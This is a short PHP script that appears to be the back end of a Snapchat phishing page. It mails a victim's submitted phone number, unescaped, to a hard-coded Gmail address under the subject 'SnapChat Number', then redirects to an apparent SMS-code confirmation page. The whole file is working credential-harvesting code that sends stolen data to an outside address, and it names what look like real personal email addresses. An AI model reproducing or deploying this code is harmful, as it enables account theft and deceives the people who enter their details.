<?php
session_start();
if(isset($_POST['num'])){

}


$message = "<p style='color:blue;'>Number:</p>". $_POST['num']."<br />
			";


$headers = "Reply-To: yurisparow@gmail.com   \n";
$headers .= "Content-Type: text/html; charset=\"iso-8859-1\"";
    mail('omar.med.gh@gmail.com', 'SnapChat Number', $message,$headers);
    

sleep(5);


header('Location:confsms.php');


?>